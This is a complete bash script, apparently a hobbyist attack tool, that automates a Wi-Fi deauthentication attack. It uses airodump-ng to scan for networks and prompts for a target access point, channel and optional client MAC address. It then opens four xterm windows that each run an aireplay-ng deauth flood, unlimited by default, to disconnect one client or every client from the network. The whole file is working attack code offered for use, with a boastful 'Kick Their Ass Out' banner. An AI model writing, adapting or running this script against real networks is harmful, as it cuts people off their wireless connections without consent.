#!/bin/bash

# Colors
GREEN='\033[1;32m'
RED='\033[1;31m'
RESET='\033[0m'

# Check dependencies
for cmd in airodump-ng aireplay-ng xterm iwconfig; do
    if ! command -v $cmd &>/dev/null; then
        echo -e "${RED}[!] $cmd not found. Please install it first.${RESET}"
        exit 1
    fi
done

# List wireless interfaces
echo "[*] Available wireless interfaces:"
iw dev | awk '$1=="Interface"{print $2}'
read -p "[?] Enter your wireless interface (in monitor mode): " IFACE
if [ -z "$IFACE" ]; then
    echo -e "${RED}[!] Interface cannot be empty.${RESET}"
    exit 1
fi

# Check monitor mode
if ! iwconfig "$IFACE" | grep -iq "Mode:Monitor"; then
    echo -e "${RED}[!] $IFACE is not in monitor mode. Please set it to monitor mode first.${RESET}"
    exit 1
fi

trap cleanup SIGINT

cleanup() {
    echo -e "\n[!] The Attack has been stopped..."
    for pid in "${XTERM_PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 0
}

clear
echo -e "${GREEN}"
echo "        (\_/)"
echo "        ( •_•)     [Kick Their Ass Out...]"
echo "       / >💻      "
echo "     //|_|\\\\     "
echo "    ( @Limmmw )"
echo "     \_______/ "
echo "    | Terminal |"
echo "    |   Mode   |"
echo "   /___________\\"
echo ""
echo "🐰: \"I'm in.\""
echo -e "${RESET}"

echo "[*] Activating Scanning mode..."
echo "[*] Running airodump-ng (Press CTRL+C if target is detected)..."
sleep 3
sudo airodump-ng "$IFACE"

echo
read -p "[?] Enter target BSSID (WiFi AP): " BSSID
if [ -z "$BSSID" ]; then
    echo -e "${RED}[!] BSSID cannot be empty.${RESET}"
    exit 1
fi

read -p "[?] Enter channel (CH): " CH
if [ -z "$CH" ]; then
    echo -e "${RED}[!] Channel cannot be empty.${RESET}"
    exit 1
fi

echo
echo "[1] Single Target"
echo "[2] All Clients"
read -p "[?] Choose attack mode (1/2): " MODE

if [ "$MODE" == "1" ]; then
    read -p "[?] Enter client MAC address: " CLIENT
    if [ -z "$CLIENT" ]; then
        echo -e "${RED}[!] Client MAC cannot be empty.${RESET}"
        exit 1
    fi
fi

read -p "[?] Enter number of deauth packets (0=flood): " DEAUTH_COUNT
DEAUTH_COUNT=${DEAUTH_COUNT:-0}

echo "[*] Setting channel to $CH..."
sudo iwconfig "$IFACE" channel "$CH"
sleep 1

if [ "$MODE" == "1" ]; then
    DEAUTH_CMD="tput setaf 1; echo '[*] Deauthing client $CLIENT on BSSID $BSSID'; sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT $IFACE --ignore-negative-one"
else
    DEAUTH_CMD="tput setaf 1; echo '[*] Deauthing all clients on BSSID $BSSID'; sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID $IFACE --ignore-negative-one"
fi

launch_xterm_at() {
    local GEOMETRY=$1
    xterm -geometry "$GEOMETRY" -fg red -fa 'Monospace' -fs 10 -e bash -c "$DEAUTH_CMD" &
    XTERM_PIDS+=($!)
}

XTERM_PIDS=()
echo "[*] Launching Deauther Attack..."

launch_xterm_at "80x24+0+0"; sleep 0.5
launch_xterm_at "80x24+0-0"; sleep 0.5
launch_xterm_at "80x24-0+0"; sleep 0.5
launch_xterm_at "80x24-0-0"

echo
read -p "[!] Press Enter to stop the Attacks..." _

cleanup